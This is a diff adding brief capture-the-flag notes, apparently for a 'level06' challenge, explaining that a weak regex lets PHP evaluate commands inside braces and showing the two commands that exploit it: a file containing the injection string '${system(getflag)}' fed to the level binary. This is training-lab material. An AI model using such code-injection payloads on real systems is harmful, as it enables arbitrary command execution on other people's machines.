@@ -1,0 +1,7 @@
+shity regex
+
+interpeter une commande en php avec {....}
+
+$ echo "[x {\${system(getflag)}}]" > /tmp/x
+
+$ ./level06 /tmp/x
